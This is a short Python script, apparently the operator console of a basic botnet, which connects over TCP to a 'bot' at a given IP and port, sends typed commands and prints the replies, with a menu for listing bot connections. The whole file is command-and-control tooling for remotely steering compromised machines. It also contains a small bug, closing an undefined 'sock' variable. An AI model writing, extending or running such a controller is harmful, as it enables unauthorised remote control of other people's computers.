#-*-coding: utf-8-*-
from socket import *
import threading
from os import system
from getpass import getpass


class Botmaster:
	def __init__(self):
		pass

	def conn2bot(self, ip, port):
		try:
			port = int(port)
		except:
			print("{} is not a port number.".format(port))
			getpass("Press 'enter' to continue...")
			return 0
		else:
			try:
				self.sock = socket(AF_INET, SOCK_STREAM)
				self.sock.connect((ip, port))
			except Exception as e:
				print("The connection to {} on port {} failed,\n{}".format(ip, port, e))
				getpass("Press 'enter' to continue...")
				return 0
			else:
				system("cls")
				cmd = ""
				recvstrings = threading.Thread(target=self.waiting4recv)
				recvstrings.daemon = True
				recvstrings.start()
				print("Input 'exit' to go back.")
				while cmd != "exit":
					cmd = input(">>>>")
					self.sock.send(cmd.encode())
				sock.close()
	def waiting4recv(self):
		print("Starting 'waiting4recv' method...")
		while True:
			r = self.sock.recv(1024).decode()
			try:
				print(r)
			except:
				pass

if __name__ == '__main__':
	bm = Botmaster()
	do = ""
	bots = {}
	while do != "exit":
		system("cls")
		print('''
		  - B O T   M A S T E R -
			___________________
			[C]onnect to a bot
			[S]how register of connections
			[exit]
			''')
		do = input(">>>>")
		do = do.lower()
		if do == "c":
			botip = input("Input the IP of the new bot: ")
			bots[botip] = input("Input the port that you are going to use to connect to the bot: ")
			bm.conn2bot(botip, bots[botip])
		elif do == "s":
			for i in bots:
				system("cls")
				print("ip: {}/ port: {}".format(i, bots[i]))
				getpass("Press 'enter' to continue...")